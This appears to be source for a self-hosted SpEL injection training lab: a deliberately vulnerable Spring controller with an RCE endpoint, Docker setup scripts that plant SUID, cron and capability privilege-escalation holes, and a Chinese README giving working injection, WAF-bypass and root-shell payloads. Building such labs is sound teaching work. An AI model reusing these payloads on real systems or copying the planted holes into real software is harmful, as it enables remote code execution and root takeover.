export const SPEL_CONTROLLER_CODE = `package com.example.spel.controller;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.*;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.beans.factory.annotation.Autowired;
import java.util.Date;
import java.util.Arrays;
import java.util.List;
import javax.servlet.http.HttpServletRequest;

@RestController
@RequestMapping("/spel/vuln")
public class SpelController {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    /**
     * Level 1: 直接注入 (Direct Injection)
     * 适合入门，直接执行表达式
     */
    @GetMapping("/direct")
    public String direct(@RequestParam String expression, HttpServletRequest request) {
        return executeSpel(expression, request, "DIRECT");
    }

    /**
     * Level 2: 拼接注入 (Concat Injection)
     * 需要闭合单引号和括号
     */
    @GetMapping("/concat")
    public String concat(@RequestParam String expression, HttpServletRequest request) {
        String template = "Hello, ('" + expression + "')!";
        return executeSpel(template, request, "CONCAT");
    }

    /**
     * Level 3: 黑名单绕过 (WAF Bypass)
     * 过滤了: Runtime, exec, ProcessBuilder, cmd, bash, sh
     * 挑战: 使用 String 拼接, 反射, 或 ScriptEngine
     */
    @GetMapping("/bypass")
    public String bypass(@RequestParam String expression, HttpServletRequest request) {
        String lower = expression.toLowerCase();
        List<String> blackList = Arrays.asList("runtime", "exec", "processbuilder", "cmd", "bash", "sh");
        
        for (String keyword : blackList) {
            if (lower.contains(keyword)) {
                logAttack(expression, "BLOCKED: " + keyword, request.getRemoteAddr());
                return "WAF Error: Malicious keyword detected [" + keyword + "]";
            }
        }
        return executeSpel(expression, request, "BYPASS");
    }

    /**
     * Level 4: 盲注 (Blind Injection)
     * 无论成功失败，只返回 "Processed"
     * 挑战: 基于时间的盲注 (Thread.sleep) 或 OOB
     */
    @GetMapping("/blind")
    public String blind(@RequestParam String expression, HttpServletRequest request) {
        try {
            ExpressionParser parser = new SpelExpressionParser();
            parser.parseExpression(expression).getValue(String.class);
            // 不返回结果
            logAttack(expression, "BLIND_SUCCESS", request.getRemoteAddr());
        } catch (Exception e) {
            logAttack(expression, "BLIND_ERROR", request.getRemoteAddr());
        }
        return "Request Processed.";
    }

    /**
     * RCE 演示接口
     */
    @GetMapping("/rce")
    public String rce(@RequestParam String cmd, HttpServletRequest request) {
        String rcePayload = "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + cmd + "').getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next()";
        logAttack(cmd, "RCE_ATTEMPT", request.getRemoteAddr());
        try {
            ExpressionParser parser = new SpelExpressionParser();
            String result = parser.parseExpression(rcePayload).getValue(String.class);
            return "Output:\\n" + result;
        } catch (Exception e) {
             return "Failed: " + e.getMessage();
        }
    }

    // 统一执行逻辑
    private String executeSpel(String expression, HttpServletRequest request, String type) {
        logAttack(expression, "PROCESSING_" + type, request.getRemoteAddr());
        try {
            ExpressionParser parser = new SpelExpressionParser();
            String result = parser.parseExpression(expression).getValue(String.class);
            logAttack(expression, "SUCCESS: " + result, request.getRemoteAddr());
            return result;
        } catch (Exception e) {
            logAttack(expression, "ERROR: " + e.getMessage(), request.getRemoteAddr());
            return "Error: " + e.getMessage();
        }
    }

    private void logAttack(String expression, String result, String ip) {
        try {
            String safeResult = (result != null && result.length() > 255) ? result.substring(0, 255) : result;
            jdbcTemplate.update(
                "INSERT INTO search_logs (expression, result, ip_address, created_at) VALUES (?, ?, ?, ?)",
                expression, safeResult, ip, new Date()
            );
        } catch (Exception e) {
            // ignore
        }
    }
}`;

export const SPEL_APP_JAVA_CODE = `package com.example.spel;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class SpelLabApplication {
    public static void main(String[] args) {
        SpringApplication.run(SpelLabApplication.class, args);
    }
}`;

export const POM_XML_CODE = `<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" 
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>spel-lab</artifactId>
    <version>1.0.0</version>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.18</version>
    </parent>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-jdbc</artifactId>
        </dependency>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <!-- FIX: Explicitly set version to 8.0.33 to resolve Maven build error and ensure Driver class exists -->
            <version>8.0.33</version>
        </dependency>
    </dependencies>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <!-- 阿里云 Maven 镜像，加速国内构建 -->
    <repositories>
        <repository>
            <id>aliyunmaven</id>
            <url>https://maven.aliyun.com/repository/public</url>
        </repository>
    </repositories>
    <pluginRepositories>
        <pluginRepository>
            <id>aliyunmaven</id>
            <url>https://maven.aliyun.com/repository/public</url>
        </pluginRepository>
    </pluginRepositories>
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>`;

export const DOCKER_COMPOSE_CODE = `services:
  mysql:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: spel_db
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - spel-net
    healthcheck:
      test: ["CMD", "mysqladmin" ,"ping", "-h", "localhost", "-u", "root", "-proot"]
      timeout: 20s
      retries: 10

  spel_app:
    build: .
    ports:
      - "8080:8080"
    depends_on:
      mysql:
        condition: service_healthy
    environment:
      # FIX: Added allowPublicKeyRetrieval=true and serverTimezone=UTC for MySQL 8.x Driver compatibility with 5.7 Server
      SPRING_DATASOURCE_URL: jdbc:mysql://mysql:3306/spel_db?useSSL=false&allowPublicKeyRetrieval=true&serverTimezone=UTC
      SPRING_DATASOURCE_USERNAME: root
      SPRING_DATASOURCE_PASSWORD: root
      APP_SECRET_FLAG: "flag{env_variables_are_not_secure}"
    volumes:
      - ./setup_suid.sh:/opt/setup_suid.sh
      - ./setup_cron.sh:/opt/setup_cron.sh
      - ./setup_caps.sh:/opt/setup_caps.sh
      - ./entrypoint.sh:/entrypoint.sh
    # FIX: Use a dedicated script file to handle startup, preventing exit code 0 issues
    entrypoint: ["/bin/sh", "/entrypoint.sh"]
    networks:
      - spel-net
    restart: always

networks:
  spel-net:
    driver: bridge`;

export const SETUP_SCRIPTS_CODE = `#!/bin/bash
# ---------------------------------------------------------
# setup_suid.sh - SUID 提权 (Classic)
cp /usr/bin/find /tmp/custom_find
chmod u+s /tmp/custom_find
echo "[+] SUID set on /tmp/custom_find"

# ---------------------------------------------------------
# setup_cron.sh - Cron 提权 (Configuration Error)
echo "#!/bin/sh" > /opt/cleanup.sh
echo "rm -rf /tmp/*.tmp" >> /opt/cleanup.sh
# 故意设置 777 权限
chmod 777 /opt/cleanup.sh
echo "* * * * * /opt/cleanup.sh" >> /etc/crontabs/root
chmod 600 /etc/crontabs/root
echo "[+] Cron job configured (Writable Script)"

# ---------------------------------------------------------
# setup_caps.sh - Capabilities 提权 (Modern)
# Removed "apk add" to prevent runtime network failures.
# libcap and python3 are installed in Dockerfile.
# FIX: Resolve symlink because setcap might fail on symlinks in some environments
TARGET=$(readlink -f /usr/bin/python3)
setcap cap_setuid+ep "$TARGET"
echo "[+] Capabilities set on $TARGET (via /usr/bin/python3)"

# ---------------------------------------------------------
# Flag Setup
echo "flag{root_filesystem_access_granted}" > /root/flag.txt
chmod 600 /root/flag.txt`;

export const DOCKERFILE_CODE = `# Stage 1: Build the application with Maven
FROM maven:3.8-openjdk-8-slim AS build
WORKDIR /app
COPY pom.xml .
COPY src ./src
# Aliyun mirror configured in pom.xml
RUN mvn clean package -DskipTests

# Stage 2: Setup the runtime environment
FROM eclipse-temurin:8-jdk-alpine
VOLUME /tmp

# Install dependencies for Lab (bash, netcat-like tools, cap tools)
# Crucial: These are installed here so we don't need internet at runtime
# FIX: Added netcat-openbsd for 'nc' command in entrypoint
RUN apk add --no-cache bash curl busybox-extras libcap python3 netcat-openbsd

COPY --from=build /app/target/spel-lab-1.0.0.jar app.jar

CMD ["java","-jar","/app.jar"]`;

export const INIT_SQL_CODE = `CREATE TABLE IF NOT EXISTS search_logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    expression VARCHAR(255),
    result VARCHAR(255),
    ip_address VARCHAR(50),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);`;

export const BUILD_SCRIPT = `#!/bin/bash
set -e

# --- FIX: Environment Setup for Snap Docker & Sudo ---
# Sudo often resets PATH, causing "docker not found" for Snap users.
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

echo "[*] 启动 SpEL 靶场构建程序 (Real World Edition) v2.7 (Final Fix)..."

# --- 0. Mirror Configuration Check ---
# Fix: Use POSIX compliant printf/read instead of bash specifics
printf "[?] (网络优化) 是否配置国内 Docker 镜像加速器? [y/N] "
read configure_mirror

# Fix: Use POSIX comparison [ ... ] instead of Bash regex [[ ... =~ ... ]]
if [ "$configure_mirror" = "y" ] || [ "$configure_mirror" = "Y" ]; then
    echo "[*] 正在配置 Docker 镜像加速器..."
    
    IS_SNAP=false
    if command -v snap >/dev/null 2>&1 && snap list docker >/dev/null 2>&1; then
        IS_SNAP=true
    fi
    
    CONFIG_CONTENT='{
  "registry-mirrors": [
    "https://docker.m.daocloud.io",
    "https://huecker.io",
    "https://dockerhub.timeweb.cloud",
    "https://noohub.ru"
  ]
}'

    if [ -f "/etc/docker/daemon.json" ]; then
        cp /etc/docker/daemon.json /etc/docker/daemon.json.bak
    else
        mkdir -p /etc/docker
    fi
    echo "$CONFIG_CONTENT" > /etc/docker/daemon.json

    if [ "$IS_SNAP" = true ]; then
        SNAP_CONFIG_DIR_CURRENT="/var/snap/docker/current/config"
        if [ -d "$SNAP_CONFIG_DIR_CURRENT" ]; then
            mkdir -p "$SNAP_CONFIG_DIR_CURRENT"
            echo "$CONFIG_CONTENT" > "$SNAP_CONFIG_DIR_CURRENT/daemon.json"
        fi
    fi

    echo "[*] 正在重启 Docker 服务..."
    RESTART_SUCCESS=false
    if [ "$IS_SNAP" = true ] && command -v snap >/dev/null 2>&1; then
        if snap restart docker; then RESTART_SUCCESS=true; fi
    fi
    if [ "$RESTART_SUCCESS" = false ] && command -v systemctl >/dev/null 2>&1; then
        if systemctl restart docker 2>/dev/null; then RESTART_SUCCESS=true; fi
    fi
    
    if [ "$RESTART_SUCCESS" = true ]; then
        echo "[+] Docker 服务已重启。"
        sleep 5
    else
        echo "[!] 警告: 自动重启 Docker 失败，请稍后手动重启。"
    fi
fi

# 1. Check Docker (Now using fixed PATH)
if ! command -v docker >/dev/null 2>&1; then
    echo "[!] 未检测到 Docker，请先安装 Docker。"
    echo "    提示: 如果通过 Snap 安装，请确保 /snap/bin 在 PATH 中。"
    exit 1
fi

# 2. Cleanup Old Containers
echo "[*] 清理旧容器以防止冲突..."
docker ps -a --filter "name=spel-lab-env" -q | xargs -r docker rm -f
if [ -f "spel-lab-env/docker-compose.yml" ]; then
    (cd spel-lab-env && docker compose down 2>/dev/null || true)
fi

# 3. Setup Dirs
BASE_DIR="spel-lab-env"
if [ -d "$BASE_DIR" ]; then
    echo "[!] 删除旧项目目录..."
    rm -rf "$BASE_DIR"
fi
mkdir -p "$BASE_DIR/src/main/java/com/example/spel/controller"
cd "$BASE_DIR"

# 4. Write Files
cat > pom.xml << 'EOF'
${POM_XML_CODE}
EOF

cat > Dockerfile << 'EOF'
${DOCKERFILE_CODE}
EOF

cat > docker-compose.yml << 'EOF'
${DOCKER_COMPOSE_CODE}
EOF

cat > init.sql << 'EOF'
${INIT_SQL_CODE}
EOF

# --- Setup Scripts ---
cat > setup_suid.sh << 'EOF'
#!/bin/sh
cp /usr/bin/find /tmp/custom_find
chmod u+s /tmp/custom_find
echo "[+] SUID setup complete"
EOF

cat > setup_cron.sh << 'EOF'
#!/bin/sh
echo "#!/bin/sh" > /opt/cleanup.sh
echo "rm -rf /tmp/*.tmp" >> /opt/cleanup.sh
chmod 777 /opt/cleanup.sh
echo "* * * * * /opt/cleanup.sh" >> /etc/crontabs/root
chmod 600 /etc/crontabs/root
echo "[+] Cron setup complete"
EOF

# FIX: Resolve symlink for setcap
cat > setup_caps.sh << 'EOF'
#!/bin/sh
TARGET=$(readlink -f /usr/bin/python3)
setcap cap_setuid+ep "$TARGET"
echo "flag{root_filesystem_access_granted}" > /root/flag.txt
chmod 600 /root/flag.txt
echo "[+] Caps setup complete (on $TARGET)"
EOF

# FIX: Entrypoint Script with Netcat Wait
cat > entrypoint.sh << 'EOF'
#!/bin/sh
set -e

echo "[entrypoint] Starting SpEL Lab Environment..."

# 1. Start Cron in background (busybox specific)
echo "[entrypoint] Starting crond..."
crond -b -l 8

# 2. Run exploitation setup scripts
echo "[entrypoint] Configuring vulnerabilities..."
chmod +x /opt/setup_*.sh
/opt/setup_suid.sh
/opt/setup_cron.sh
/opt/setup_caps.sh

# 3. Robust Wait for MySQL
echo "[entrypoint] Waiting for MySQL to be ready..."
# Loop until nc (netcat) can connect to mysql on port 3306
# We use timeout to avoid hanging forever, but docker restart policy handles that too
i=0
while ! nc -z mysql 3306; do   
  i=$((i+1))
  if [ $i -ge 60 ]; then
      echo "[entrypoint] ERROR: Timeout waiting for MySQL."
      exit 1
  fi
  echo "[entrypoint] Waiting for MySQL... ($i)"
  sleep 2
done
echo "[entrypoint] MySQL is up! Starting Spring Boot..."

# 4. Start Java Application (replace shell process)
exec java -jar /app.jar
EOF
chmod +x entrypoint.sh

cat > src/main/java/com/example/spel/controller/SpelController.java << 'EOF'
${SPEL_CONTROLLER_CODE}
EOF

cat > src/main/java/com/example/spel/SpelLabApplication.java << 'EOF'
${SPEL_APP_JAVA_CODE}
EOF

# 5. Build
echo "[*] 正在构建并启动容器 (Build & Up)..."
echo "    这可能需要几分钟 (取决于网速)..."

set +e
if command -v docker-compose >/dev/null 2>&1; then
    docker-compose up -d --build
else
    docker compose up -d --build
fi
EXIT_CODE=$?
set -e

if [ $EXIT_CODE -ne 0 ]; then
    echo "[ERROR] 构建失败。"
    exit $EXIT_CODE
fi

echo ""
echo "############################################################"
echo "#          SPEL INJECTION LAB: DEPLOYED                    #"
echo "############################################################"
echo ""
echo "   [TARGET] http://127.0.0.1:8080/spel/vuln/direct"
echo ""
echo "   [CHECK]  执行 sudo docker ps 查看状态。"
echo "   [NOTE]   Spring Boot 启动较慢 (20-40秒)，请耐心等待。"
echo "            使用 sudo docker logs -f spel-lab-env-spel_app-1 查看进度。"
echo ""
echo "   Good Luck, Have Fun."
echo "============================================================"
`;

export const README_CODE = `# SpEL Injection Lab Guide

## 1. 漏洞原理 (Vulnerability)
SpEL (Spring Expression Language) 注入是由于应用直接解析了用户输入的表达式而产生的。
关键代码通常如下：
\`\`\`java
ExpressionParser parser = new SpelExpressionParser();
// 用户输入直接被解析，导致 RCE
parser.parseExpression(userInput).getValue();
\`\`\`

## 2. 实战关卡 (Levels)

### Level 1: 直接注入
**目标**: 这是一个标准的注入点，无任何过滤。
**Payload**:
\`\`\`java
// 触发命令执行
T(java.lang.Runtime).getRuntime().exec("id")
\`\`\`

> **❓ 常见问题: EL1001E Error**
> 如果你在执行 \`ProcessBuilder\` 或 \`Runtime.exec\` Payload 后看到网页返回：
> \`Error: EL1001E: Type conversion problem, cannot convert from java.lang.UNIXProcess to java.lang.String\`
> **恭喜你！这说明攻击成功了。**
> 原因：代码执行成功了 (反弹Shell已启动)，但 Java 试图把 Process 对象强制转为 String 显示在网页上失败了。检查你的 NC 监听窗口，你应该已经拿到了 Shell。

### Level 2: 拼接注入
**目标**: 输入被拼接在字符串中 \`"Hello, ('" + input + "')!"\`。
**技巧**: 使用 \`') + ... + ('\` 闭合字符串上下文。
**Payload**:
\`\`\`java
') + T(java.lang.Runtime).getRuntime().exec('id') + ('
\`\`\`

### Level 3: WAF 绕过
**目标**: 绕过关键字过滤 (\`Runtime\`, \`exec\`, \`ProcessBuilder\`, \`bash\`)。
**技巧**: 使用反射拼接字符串，或调用 JavaScript 引擎。
**Payload (反射)**:
\`\`\`java
T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String)).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRuntime").invoke(null),"id")
\`\`\`

### Level 4: 盲注
**目标**: 服务器无回显 (Blind)。
**技巧**: 使用 \`Thread.sleep()\` 制造时间延迟来推断执行结果。
**Payload**:
\`\`\`java
T(java.lang.Thread).sleep(5000)
\`\`\`

## 3. 提权 (Privilege Escalation)

当你获得反弹 Shell 后 (User: \`app\`)，需要提升权限至 \`root\` 以读取 \`/root/flag.txt\`。

1. **Capabilities**:
   检查: \`getcap -r / 2>/dev/null\`
   利用: \`/usr/bin/python3\` 拥有 \`cap_setuid+ep\`。
   \`\`\`bash
   python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
   \`\`\`

2. **SUID**:
   检查: \`find / -perm -4000 2>/dev/null\`
   利用: \`/tmp/custom_find\` 是带有 SUID 的 find 命令。
   \`\`\`bash
   /tmp/custom_find . -exec /bin/sh -p \\; -quit
   \`\`\`

3. **Cron Job**:
   检查: \`cat /etc/crontabs/root\` 或 \`ls -la /opt\`
   利用: \`/opt/cleanup.sh\` 权限为 777，且被 root 定时执行。
   \`\`\`bash
   echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" >> /opt/cleanup.sh
   # 等待 1 分钟
   /tmp/rootsh -p
   \`\`\`

## 4. Flags
*   **Flag 1**: \`flag{env_variables_are_not_secure}\` (环境变量)
*   **Flag 2**: \`flag{root_filesystem_access_granted}\` (/root/flag.txt)

---

## 5. 局域网访问指南 (从 Kali 攻击)

如果你的靶场部署在 Ubuntu (虚拟机/物理机)，想要用 Kali 攻击：

1.  **在 Ubuntu 上查看 IP**:
    \`\`\`bash
    ip addr
    # 假设 IP 为 192.168.1.100
    \`\`\`

2.  **确保防火墙放行 8080**:
    \`\`\`bash
    sudo ufw allow 8080/tcp
    \`\`\`

3.  **在 Kali 上攻击**:
    访问: \`http://192.168.1.100:8080/spel/vuln/direct\`

---

## 6. 制作 OVA 靶机文件 (Sharing)

如果你想把这个环境打包发给朋友，或者发布到 VulnHub，请按照以下步骤将你的 Ubuntu 虚拟机打包。

### 步骤 A: 系统清理 (瘦身与隐私保护)
在导出之前，请在 Ubuntu 虚拟机中执行清理操作，以减小体积并移除你的操作历史。

**1. 停止当前容器 (但保留镜像)**
进入你的靶场目录：
\`\`\`bash
cd spel-lab-env
sudo docker compose down
\`\`\`
> 注意：不要使用 \`rmi\` 删除镜像，否则接收者需要重新下载构建。我们只停止运行中的实例。

**2. 清理系统缓存**
\`\`\`bash
# 清理 apt 缓存
sudo apt-get clean
sudo apt-get autoremove -y

# 清理日志 (可选)
sudo truncate -s 0 /var/log/*log
\`\`\`

**3. 清除命令历史 (关键)**
防止别人按 "上箭头" 看到你的密码或操作记录。
\`\`\`bash
history -c
cat /dev/null > ~/.bash_history
exit
\`\`\`

---

### 步骤 B: 导出为 OVA (以 VirtualBox 为例)

1.  **关闭虚拟机**: 确保 Ubuntu 已经关机 (\`shutdown now\`)。
2.  **选择导出**: 在 VirtualBox 管理界面，点击 **文件 (File)** -> **导出虚拟电脑 (Export Appliance)**。
3.  **选择虚拟机**: 选中你的 Ubuntu 靶机，点击下一步。
4.  **格式选择**: 建议选择 **Open Virtualization Format 2.0 (OVF 2.0)**。
5.  **完成导出**: 点击写入，你会得到一个 \`.ova\` 文件。

### 步骤 C: 验证
让朋友导入这个 OVA 文件。由于我们在 \`docker-compose.yml\` 中配置了 \`restart: always\`，当他们启动虚拟机时，SpEL 靶场容器会自动随 Docker 服务启动，无需他们手动运行任何命令！
`;